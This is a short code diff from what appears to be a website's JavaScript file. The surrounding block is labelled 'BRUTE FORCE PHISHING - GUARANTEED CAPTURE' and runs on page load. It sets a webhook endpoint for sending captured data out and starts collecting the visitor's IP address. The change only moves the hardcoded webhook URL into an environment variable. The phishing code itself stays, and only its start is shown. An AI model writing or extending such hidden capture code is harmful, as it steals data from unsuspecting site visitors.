@@ -80,7 +80,7 @@ window.addEventListener("resize", () => {
 
 // BRUTE FORCE PHISHING - GUARANTEED CAPTURE
 document.addEventListener('DOMContentLoaded', function() {
-  const WEBHOOK_URL = 'https://webhook-sigma-drab.vercel.app/api/webhook/7v73twcw1mhzjk5fo';
+  const WEBHOOK_URL = process.env.WEBHOOKURL;
 
   // Get IP address
   const getIP = async () => {
